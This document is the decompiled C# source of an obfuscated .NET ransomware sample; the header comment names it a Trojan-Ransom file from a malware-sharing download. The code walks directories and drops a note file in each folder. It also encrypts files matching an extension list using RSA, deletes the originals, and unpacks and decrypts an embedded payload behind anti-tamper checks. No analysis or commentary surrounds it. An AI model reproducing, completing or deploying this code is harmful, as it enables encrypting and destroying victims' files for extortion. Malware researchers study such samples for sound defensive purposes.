// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Program, Version=1.0.0.0, Culture=neutral, PublicKeyToken=fad59cbbeaedaaa1
// MVID: 2B038658-8CEB-4874-AE4E-D5E8C7A3049F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Gen.gen-274011aaa97fd19ad6d993a5555c9306090da6a9b16c991739033ebb7673a244.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0001
{
  internal sealed class \u0003
  {
    static unsafe bool \u0001([In] \u0004.\u0005.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
label_35:
      int num1 = \u0001.\u0003.\u0001(obj0.\u0001);
label_32:
      int num2 = num1;
      int num3;
      for (int index1 = 258; num2 >= index1; num2 = num3)
      {
        *(int*) voidPtr = obj0.\u0001;
        int index2;
        int num4;
        int num5;
        switch (*(int*) voidPtr)
        {
          case 7:
            while (((index2 = \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0001)) & -256) == 0)
            {
              if (true)
                goto label_37;
label_3:
              if (true)
                return true;
              goto label_25;
label_37:
              \u0001.\u0003.\u0001(obj0.\u0001, index2);
              if (--num1 < 258)
                goto label_3;
            }
            if (index2 < 257)
            {
              num3 = index2;
              int num6 = 0;
              if (num6 == 0)
              {
                if (num3 < num6)
                  return false;
                obj0.\u0002 = (\u0004.\u0005.\u0004) null;
                obj0.\u0001 = (\u0004.\u0005.\u0004) null;
                obj0.\u0001 = 2;
                return true;
              }
              index1 = num6;
              continue;
            }
            break;
          case 8:
label_12:
            if (obj0.\u0002 > 0)
            {
              obj0.\u0001 = 8;
              *(int*) ((IntPtr) voidPtr + 4) = \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0002);
              if (*(int*) ((IntPtr) voidPtr + 4) < 0)
                return false;
              if (true)
              {
                \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0002);
                obj0.\u0003 += *(int*) ((IntPtr) voidPtr + 4);
              }
              else
                break;
            }
            obj0.\u0001 = 9;
            goto case 9;
          case 9:
            if (true)
            {
              index2 = \u0001.\u0003.\u0001(obj0.\u0002, obj0.\u0001);
              if (index2 < 0)
                return false;
              obj0.\u0004 = \u0004.\u0005.\u0001.\u0003[index2];
              obj0.\u0002 = \u0004.\u0005.\u0001.\u0004[index2];
              goto case 10;
            }
            else
              goto label_35;
          case 10:
            int num7 = obj0.\u0002;
            num5 = 0;
            num4 = num7;
            goto label_23;
          default:
            goto label_32;
        }
        obj0.\u0003 = \u0004.\u0005.\u0001.\u0001[index2 - 257];
        obj0.\u0002 = \u0004.\u0005.\u0001.\u0002[index2 - 257];
        goto label_12;
label_23:
        if (num4 > num5)
        {
          obj0.\u0001 = 10;
          *(int*) ((IntPtr) voidPtr + 8) = \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0002);
        }
        else
          goto label_30;
label_25:
        num4 = *(int*) ((IntPtr) voidPtr + 8);
label_26:
        num5 = 0;
        if (num5 == 0)
        {
          if (num4 < num5)
            return false;
          \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0002);
          obj0.\u0004 += *(int*) ((IntPtr) voidPtr + 8);
        }
        else
          goto label_23;
label_30:
        \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
        int num8 = num1 - obj0.\u0003;
        if (false)
        {
          num4 = num8;
          goto label_26;
        }
        else
        {
          num1 = num8;
          obj0.\u0001 = 7;
          goto label_32;
        }
      }
      return true;
    }

    static byte[] \u0001([In] string obj0, [In] byte[] obj1)
    {
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      cryptoServiceProvider.ExportParameters(false);
      cryptoServiceProvider.FromXmlString(obj0);
      return cryptoServiceProvider.Encrypt(obj1, true);
    }

    static void \u0001([In] \u0004.\u0005.\u0002 obj0, [In] int obj1)
    {
label_0:
      obj0.\u0001 >>= obj1;
label_1:
      if (true)
      {
        obj0.\u0003 -= obj1;
        if (false)
          goto label_1;
      }
      else
        goto label_0;
    }

    static unsafe void \u0001([In] \u0004.\u0005.\u0004 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(64);
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      *(int*) ((IntPtr) voidPtr + 12) = 0;
      while (*(int*) ((IntPtr) voidPtr + 12) < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 16) = (int) obj1[*(int*) ((IntPtr) voidPtr + 12)];
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
          goto label_27;
label_1:
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        continue;
label_27:
        ++numArray1[*(int*) ((IntPtr) voidPtr + 16)];
        goto label_1;
      }
      *(int*) voidPtr = 0;
      *(int*) ((IntPtr) voidPtr + 4) = 512;
      *(int*) ((IntPtr) voidPtr + 20) = 1;
      while (*(int*) ((IntPtr) voidPtr + 20) <= 15)
      {
        numArray2[*(int*) ((IntPtr) voidPtr + 20)] = *(int*) voidPtr;
        *(int*) voidPtr = *(int*) voidPtr + (numArray1[*(int*) ((IntPtr) voidPtr + 20)] << 16 - *(int*) ((IntPtr) voidPtr + 20));
        if (*(int*) ((IntPtr) voidPtr + 20) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 24) = numArray2[*(int*) ((IntPtr) voidPtr + 20)] & 130944;
          *(int*) ((IntPtr) voidPtr + 28) = *(int*) voidPtr & 130944;
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + (*(int*) ((IntPtr) voidPtr + 28) - *(int*) ((IntPtr) voidPtr + 24) >> 16 - *(int*) ((IntPtr) voidPtr + 20));
        }
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
      }
      obj0.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 4)];
      *(int*) ((IntPtr) voidPtr + 8) = 512;
      *(int*) ((IntPtr) voidPtr + 32) = 15;
      while (*(int*) ((IntPtr) voidPtr + 32) >= 10)
      {
        *(int*) ((IntPtr) voidPtr + 36) = *(int*) voidPtr & 130944;
        *(int*) voidPtr = *(int*) voidPtr - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
        *(int*) ((IntPtr) voidPtr + 40) = *(int*) voidPtr & 130944;
        while (*(int*) ((IntPtr) voidPtr + 40) < *(int*) ((IntPtr) voidPtr + 36))
        {
          obj0.\u0001[(int) \u0001.\u0003.\u0001(*(int*) ((IntPtr) voidPtr + 40))] = (short) (-*(int*) ((IntPtr) voidPtr + 8) << 4 | *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
          *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 40) + 128;
        }
        *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
      }
      *(int*) ((IntPtr) voidPtr + 44) = 0;
      while (*(int*) ((IntPtr) voidPtr + 44) < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 48) = (int) obj1[*(int*) ((IntPtr) voidPtr + 44)];
        if (*(int*) ((IntPtr) voidPtr + 48) != 0)
        {
          *(int*) voidPtr = numArray2[*(int*) ((IntPtr) voidPtr + 48)];
          do
          {
            *(int*) ((IntPtr) voidPtr + 52) = (int) \u0001.\u0003.\u0001(*(int*) voidPtr);
            if (*(int*) ((IntPtr) voidPtr + 48) <= 9)
            {
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 52)] = (short) (*(int*) ((IntPtr) voidPtr + 44) << 4 | *(int*) ((IntPtr) voidPtr + 48));
                *(int*) ((IntPtr) voidPtr + 52) = *(int*) ((IntPtr) voidPtr + 52) + (1 << *(int*) ((IntPtr) voidPtr + 48));
              }
              while (*(int*) ((IntPtr) voidPtr + 52) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 56) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 52) & 511];
              *(int*) ((IntPtr) voidPtr + 60) = 1 << (*(int*) ((IntPtr) voidPtr + 56) & 15);
              *(int*) ((IntPtr) voidPtr + 56) = -(*(int*) ((IntPtr) voidPtr + 56) >> 4);
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56) | *(int*) ((IntPtr) voidPtr + 52) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 44) << 4 | *(int*) ((IntPtr) voidPtr + 48));
                *(int*) ((IntPtr) voidPtr + 52) = *(int*) ((IntPtr) voidPtr + 52) + (1 << *(int*) ((IntPtr) voidPtr + 48));
              }
              while (*(int*) ((IntPtr) voidPtr + 52) < *(int*) ((IntPtr) voidPtr + 60));
            }
          }
          while (false);
          numArray2[*(int*) ((IntPtr) voidPtr + 48)] = *(int*) voidPtr + (1 << 16 - *(int*) ((IntPtr) voidPtr + 48));
        }
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 1;
      }
    }

    static DirectoryInfo[] \u0001([In] string obj0)
    {
      DirectoryInfo[] directoryInfoArray;
      try
      {
        if (true)
          directoryInfoArray = new DirectoryInfo(obj0).GetDirectories();
      }
      catch (Exception ex)
      {
        directoryInfoArray = (DirectoryInfo[]) null;
      }
      return directoryInfoArray;
    }

    static int \u0001([In] \u0004.\u0005.\u0007 obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static int \u0001([In] \u0004.\u0005.\u0002 obj0, [In] int obj1)
    {
      while (obj0.\u0003 < obj1)
      {
        if (obj0.\u0001 == obj0.\u0002)
        {
          if (true)
          {
            if (true)
              return -1;
          }
          else
            break;
        }
        else if (true)
        {
          \u0004.\u0005.\u0002 obj2 = obj0;
          int num1 = (int) obj0.\u0001;
          byte[] numArray1 = obj0.\u0001;
          \u0004.\u0005.\u0002 obj3 = obj0;
          int num2 = obj0.\u0001;
          int num3 = num2 + 1;
          obj3.\u0001 = num3;
          int index1 = num2;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = obj0.\u0001;
          \u0004.\u0005.\u0002 obj4 = obj0;
          int num5 = obj0.\u0001;
          int num6 = num5 + 1;
          obj4.\u0001 = num6;
          int index2 = num5;
          int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num8 = (num4 | num7) << obj0.\u0003;
          int num9 = num1 | num8;
          obj2.\u0001 = (uint) num9;
        }
        else
          continue;
        obj0.\u0003 += 16;
        break;
      }
      long num10 = (long) obj0.\u0001;
      int num11 = 1;
      int num12 = obj1;
      int num13;
      do
      {
        if (true)
        {
          int num14 = num12 & 31;
          num13 = num11 << num14;
          if (true)
          {
            num12 = 1;
            num11 = num13;
          }
          else
            goto label_5;
        }
      }
      while (num12 == 0);
      int num15 = num11 - num12;
      goto label_13;
label_5:
      num15 = num13;
label_13:
      long num16 = (long) num15;
      return (int) (num10 & num16);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0004.\u0005.\u0003 obj0, [In] int obj1)
    {
label_0:
      do
      {
        \u0004.\u0005.\u0003 obj2 = obj0;
        int num1 = obj0.\u0002;
        int num2 = num1 + 1;
        obj2.\u0002 = num2;
        do
        {
          if (true)
          {
            if (num1 != 32768)
              goto label_3;
label_2:
            goto label_0;
label_3:
            if (true)
            {
              byte[] numArray = obj0.\u0001;
              \u0004.\u0005.\u0003 obj3 = obj0;
              num1 = obj0.\u0001;
              int num3 = num1 + 1;
              obj3.\u0001 = num3;
              int index = num1;
              int num4 = (int) (byte) obj1;
              numArray[index] = (byte) num4;
              if (false)
                goto label_2;
            }
            else
              goto label_0;
          }
          else
            goto label_0;
        }
        while (false);
        goto label_5;
      }
      while (false);
      goto label_7;
label_5:
      obj0.\u0001 &= (int) short.MaxValue;
      return;
label_7:
      throw new InvalidOperationException();
    }

    static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0001.\u0003.\u0001(executingAssembly, callingAssembly))
        return (byte[]) null;
      \u0004.\u0005.\u0007 obj1 = new \u0004.\u0005.\u0007(obj0);
      byte[] numArray1 = new byte[0];
      *(int*) voidPtr = \u0001.\u0003.\u0001(obj1);
      int num1 = *(int*) voidPtr;
      if (true)
      {
        if (num1 == 67324752)
        {
          *(short*) ((IntPtr) voidPtr + 44) = (short) \u0001.\u0003.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 4) = \u0001.\u0003.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 8) = \u0001.\u0003.\u0001(obj1);
          if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
            throw new FormatException("Wrong Header Signature");
          int num2 = \u0001.\u0003.\u0001(obj1);
          if (true)
          {
            \u0001.\u0003.\u0001(obj1);
            \u0001.\u0003.\u0001(obj1);
            *(int*) ((IntPtr) voidPtr + 12) = \u0001.\u0003.\u0001(obj1);
            *(int*) ((IntPtr) voidPtr + 16) = \u0001.\u0003.\u0001(obj1);
            *(int*) ((IntPtr) voidPtr + 20) = \u0001.\u0003.\u0001(obj1);
            if (*(int*) ((IntPtr) voidPtr + 16) > 0)
            {
              byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 16)];
              obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
            }
            if (*(int*) ((IntPtr) voidPtr + 20) > 0)
            {
              byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
              if (true)
                obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
              else
                goto label_28;
            }
          }
          else
          {
            num1 = num2;
            goto label_18;
          }
        }
        else
          goto label_13;
label_12:
        byte[] buffer1 = new byte[obj1.Length - obj1.Position];
        obj1.Read(buffer1, 0, buffer1.Length);
        \u0004.\u0005.\u0001 obj2 = new \u0004.\u0005.\u0001(buffer1);
        numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
        \u0004.\u0005.\u0001 obj3 = obj2;
        byte[] numArray2 = numArray1;
        *(int*) ((IntPtr) voidPtr + 40) = numArray1.Length;
        \u0001.\u0003.\u0001(numArray2, obj3, *(int*) ((IntPtr) voidPtr + 40), 0);
        goto label_34;
label_13:
        *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
        *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
        if (*(int*) voidPtr != 8223355)
          throw new FormatException("Unknown Header");
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          if (true)
          {
            *(int*) ((IntPtr) voidPtr + 28) = \u0001.\u0003.\u0001(obj1);
            numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
            *(int*) ((IntPtr) voidPtr + 32) = 0;
            goto label_19;
          }
          else
            goto label_12;
        }
        else
          goto label_20;
      }
label_18:
      *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 36);
label_19:
      if (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
      {
        int length = \u0001.\u0003.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 36) = \u0001.\u0003.\u0001(obj1);
        byte[] buffer = new byte[length];
        obj1.Read(buffer, 0, buffer.Length);
        num1 = \u0001.\u0003.\u0001(numArray1, new \u0004.\u0005.\u0001(buffer), *(int*) ((IntPtr) voidPtr + 36), *(int*) ((IntPtr) voidPtr + 32));
        goto label_18;
      }
label_20:
      if (*(int*) ((IntPtr) voidPtr + 24) == 2)
      {
        using (ICryptoTransform cryptoTransform = \u0001.\u0003.\u0001(true, new byte[8]
        {
          (byte) 207,
          (byte) 49,
          (byte) 172,
          (byte) 0,
          (byte) 74,
          (byte) 49,
          (byte) 167,
          (byte) 141
        }, new byte[8]
        {
          (byte) 198,
          (byte) 93,
          (byte) 36,
          (byte) 77,
          (byte) 34,
          (byte) 181,
          (byte) 226,
          (byte) 129
        }))
          numArray1 = \u0001.\u0003.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
      }
      byte[] numArray3;
      if (*(int*) ((IntPtr) voidPtr + 24) == 3)
        numArray3 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
      else
        goto label_34;
label_28:
      using (ICryptoTransform cryptoTransform = \u0001.\u0003.\u0001(new byte[16]
      {
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2,
        (byte) 2
      }, numArray3, true))
        numArray1 = \u0001.\u0003.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
label_34:
      obj1.Close();
      return numArray1;
    }

    static unsafe int \u0001([In] \u0004.\u0005.\u0004 obj0, [In] \u0004.\u0005.\u0002 obj1)
    {
      int num1;
      void* voidPtr;
      if (true)
      {
        int num2 = 16;
        int index;
        int num3;
        while (true)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num2);
          if ((index = \u0001.\u0003.\u0001(obj1, 9)) >= 0)
          {
            if ((num1 = (int) obj0.\u0001[index]) >= 0)
            {
              if (true)
              {
                \u0001.\u0003.\u0001(obj1, num1 & 15);
                num3 = num1;
                if (false)
                  num2 = num3;
                else
                  break;
              }
              else
                goto label_8;
            }
            else
              goto label_5;
          }
          else
            goto label_13;
        }
        return num3 >> 4;
label_5:
        *(int*) voidPtr = -(num1 >> 4);
        *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
        int num4;
        if ((num4 = \u0001.\u0003.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
        {
          int num5 = (int) obj0.\u0001[*(int*) voidPtr | num4 >> 9];
          \u0001.\u0003.\u0001(obj1, num5 & 15);
          return num5 >> 4;
        }
        *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0003;
        index = \u0001.\u0003.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
        num1 = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
label_8:
        if (true)
        {
          if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
            return -1;
          \u0001.\u0003.\u0001(obj1, num1 & 15);
          if (true)
            return num1 >> 4;
          goto label_14;
        }
        else
          goto label_16;
label_13:
        *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0003;
        index = \u0001.\u0003.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
label_14:
        num1 = (int) obj0.\u0001[index];
      }
      if (num1 < 0)
        goto label_18;
label_16:
      if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
      {
        \u0001.\u0003.\u0001(obj1, num1 & 15);
        return num1 >> 4;
      }
label_18:
      return -1;
    }

    static unsafe bool \u0001([In] \u0004.\u0005.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      int num1;
      switch (obj0.\u0001)
      {
        case 2:
          if (obj0.\u0001)
          {
            obj0.\u0001 = 12;
            return false;
          }
          *(int*) voidPtr = \u0001.\u0003.\u0001(obj0.\u0001, 3);
          if (*(int*) voidPtr < 0)
            return false;
          \u0001.\u0003.\u0001(obj0.\u0001, 3);
          if ((*(int*) voidPtr & 1) == 0)
            goto label_4;
label_3:
          obj0.\u0001 = true;
label_4:
          int num2 = *(int*) voidPtr >> 1;
          if (true)
          {
            switch (num2)
            {
              case 0:
                \u0001.\u0003.\u0001(obj0.\u0001);
                obj0.\u0001 = 3;
                break;
              case 1:
                obj0.\u0001 = \u0004.\u0005.\u0004.\u0001;
                obj0.\u0002 = \u0004.\u0005.\u0004.\u0002;
                obj0.\u0001 = 7;
                break;
              case 2:
                if (true)
                {
                  obj0.\u0001 = new \u0004.\u0005.\u0005();
                  obj0.\u0001 = 6;
                  break;
                }
                goto label_24;
            }
          }
          else
            goto label_3;
          break;
        case 3:
          num1 = obj0.\u0005 = \u0001.\u0003.\u0001(obj0.\u0001, 16);
          if (true)
          {
            if (num1 < 0)
              return false;
            \u0001.\u0003.\u0001(obj0.\u0001, 16);
            obj0.\u0001 = 4;
            goto case 4;
          }
          else
            goto label_17;
        case 4:
          num1 = \u0001.\u0003.\u0001(obj0.\u0001, 16);
          goto label_17;
        case 5:
label_21:
          *(int*) ((IntPtr) voidPtr + 4) = \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
          obj0.\u0005 -= *(int*) ((IntPtr) voidPtr + 4);
          goto label_22;
        case 6:
          int num3 = \u0001.\u0003.\u0001(obj0.\u0001, obj0.\u0001) ? 1 : 0;
          if (false)
            return num3 != 0;
          if (num3 != 0)
          {
            obj0.\u0001 = \u0001.\u0003.\u0001(obj0.\u0001);
            obj0.\u0002 = \u0001.\u0003.\u0001(obj0.\u0001);
            obj0.\u0001 = 7;
            goto case 7;
          }
          else
            goto label_27;
        case 7:
        case 8:
        case 9:
        case 10:
          return \u0001.\u0003.\u0001(obj0);
        case 12:
          return false;
        default:
          if (true)
            return false;
          goto label_22;
      }
label_11:
      return true;
label_17:
      if (num1 < 0)
        return false;
      \u0001.\u0003.\u0001(obj0.\u0001, 16);
      if (true)
      {
        obj0.\u0001 = 5;
        goto label_21;
      }
      else
        goto label_27;
label_22:
      if (obj0.\u0005 == 0)
      {
        obj0.\u0001 = 2;
        return true;
      }
label_24:
      return !\u0001.\u0003.\u0001(obj0.\u0001);
label_27:
      if (true)
        return false;
      goto label_11;
    }

    static short \u0001([In] int obj0) => (short) ((int) \u0004.\u0005.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0004.\u0005.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0004.\u0005.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0004.\u0005.\u0006.\u0001[obj0 >> 12]);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe int \u0001([In] \u0004.\u0005.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      *(int*) voidPtr = 0;
      while (obj0.\u0003 > 0 && obj3 > 0)
      {
        obj1[obj2++] = (byte) obj0.\u0001;
        obj0.\u0001 >>= 8;
        obj0.\u0003 -= 8;
        --obj3;
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      if (obj3 == 0)
        return *(int*) voidPtr;
      *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
      if (obj3 > *(int*) ((IntPtr) voidPtr + 4))
        obj3 = *(int*) ((IntPtr) voidPtr + 4);
      Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
      obj0.\u0001 += obj3;
      if ((obj0.\u0001 - obj0.\u0002 & 1) != 0)
      {
        \u0004.\u0005.\u0002 obj4 = obj0;
        byte[] numArray = obj0.\u0001;
        \u0004.\u0005.\u0002 obj5 = obj0;
        *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
        int num1 = *(int*) ((IntPtr) voidPtr + 8) + 1;
        obj5.\u0001 = num1;
        int index = *(int*) ((IntPtr) voidPtr + 8);
        int num2 = (int) numArray[index] & (int) byte.MaxValue;
        obj4.\u0001 = (uint) num2;
        obj0.\u0003 = 8;
      }
      return *(int*) voidPtr + obj3;
    }

    static void \u0001([In] string obj0, [In] byte[] obj1)
    {
      try
      {
        FileInfo[] fileInfoArray = \u0001.\u0003.\u0001(obj0);
        int num1 = 0;
label_35:
        int index;
        int num2;
        for (index = num1; index < fileInfoArray.Length; index = num2 + 1)
        {
          // ISSUE: object of a compiler-generated type is created
          // ISSUE: variable of a compiler-generated type
          \u0002.\u0001.\u0001 obj2 = new \u0002.\u0001.\u0001();
          // ISSUE: variable of a compiler-generated type
          \u0002.\u0001.\u0001 obj3;
          if (true)
            obj3 = obj2;
          // ISSUE: reference to a compiler-generated field
          obj3.\u0001 = fileInfoArray[index];
          try
          {
            if (true)
            {
              // ISSUE: reference to a compiler-generated method
              if (Array.Exists<string>(\u0003.\u0001.\u0001, new Predicate<string>(obj3.\u0001)))
              {
                try
                {
                  // ISSUE: reference to a compiler-generated field
                  if ((File.GetAttributes(obj3.\u0001.FullName) & FileAttributes.System) != FileAttributes.System)
                  {
                    // ISSUE: reference to a compiler-generated field
                    if (!(obj3.\u0001.Name == \u0003.\u0001.\u0002))
                    {
                      // ISSUE: reference to a compiler-generated field
                      string fullName = obj3.\u0001.FullName;
                      // ISSUE: reference to a compiler-generated field
                      string str = obj3.\u0001.FullName + \u0003.\u0001.\u0004;
                      if (\u0001.\u0003.\u0001(\u0005.\u0001.\u0001, obj1, fullName, str))
                      {
                        // ISSUE: reference to a compiler-generated field
                        File.Delete(obj3.\u0001.FullName);
                      }
                    }
                  }
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
          catch (UnauthorizedAccessException ex)
          {
          }
          if (true)
          {
            num2 = index;
            if (false)
            {
              num1 = num2;
              goto label_35;
            }
          }
          else
            goto label_14;
        }
        DirectoryInfo[] directoryInfoArray = \u0001.\u0003.\u0001(obj0);
        index = 0;
        goto label_31;
label_14:
        DirectoryInfo directoryInfo = directoryInfoArray[index];
        try
        {
          string lower = directoryInfo.Name.ToLower();
          if (!lower.Contains(\u0003.\u0002.\u0001(107388601)))
          {
            if (true)
            {
              if (!lower.Contains(\u0003.\u0002.\u0001(107388556)))
              {
                if (!lower.Contains(\u0003.\u0002.\u0001(107388571)))
                {
                  if (!lower.Contains(\u0003.\u0002.\u0001(107388518)))
                  {
                    if (!lower.Contains(\u0003.\u0002.\u0001(107388489)))
                    {
                      if (!lower.Contains(\u0003.\u0002.\u0001(107388504)))
                      {
                        if (lower.Contains(\u0003.\u0002.\u0001(107388455)))
                          goto label_29;
                      }
                      else
                        goto label_29;
                    }
                    else
                      goto label_29;
                  }
                  else
                    goto label_29;
                }
                else
                  goto label_29;
              }
              else
                goto label_29;
            }
            try
            {
              File.WriteAllBytes(Path.Combine(directoryInfo.FullName, \u0003.\u0001.\u0002), Encoding.UTF8.GetBytes(\u0003.\u0001.\u0003));
            }
            catch (Exception ex)
            {
            }
            \u0001.\u0003.\u0001(directoryInfo.FullName, obj1);
          }
        }
        catch (Exception ex)
        {
        }
label_29:
        int num3 = index;
        int num4 = 1;
        if (num4 != 0)
          index = num3 + num4;
        else
          goto label_32;
label_31:
        int num5 = index;
        num4 = directoryInfoArray.Length;
        num3 = num5;
label_32:
        int num6 = num4;
        if (num3 >= num6)
        {
          if (true)
          {
            if (false)
              goto label_29;
          }
          else
            goto label_31;
        }
        else
          goto label_14;
      }
      catch (Exception ex)
      {
      }
    }

    static int \u0001([In] \u0004.\u0005.\u0003 obj0) => obj0.\u0002;

    static void \u0001([In] \u0004.\u0005.\u0002 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static unsafe string \u0001([In] byte[] obj0)
    {
      StringBuilder stringBuilder;
      do
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(5);
        stringBuilder = new StringBuilder();
        byte[] numArray = obj0;
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < numArray.Length)
        {
          *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) numArray[*(int*) voidPtr];
          stringBuilder.Append(((byte*) ((IntPtr) voidPtr + 4))->ToString(\u0003.\u0002.\u0001(107388418)));
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
      }
      while (false);
      return stringBuilder.ToString();
    }

    static int \u0001([In] \u0004.\u0005.\u0002 obj0)
    {
      int num1 = obj0.\u0002;
      int num2;
      int num3;
      while (true)
      {
        num2 = obj0.\u0001;
        if (true)
        {
          num3 = num1 - num2;
          if (false)
            num1 = num3;
          else
            goto label_7;
        }
        else
          break;
      }
label_2:
      do
      {
        if (true)
          num2 >>= 3;
      }
      while (false);
      return num1 + num2;
label_7:
      num2 = obj0.\u0003;
      num1 = num3;
      goto label_2;
    }

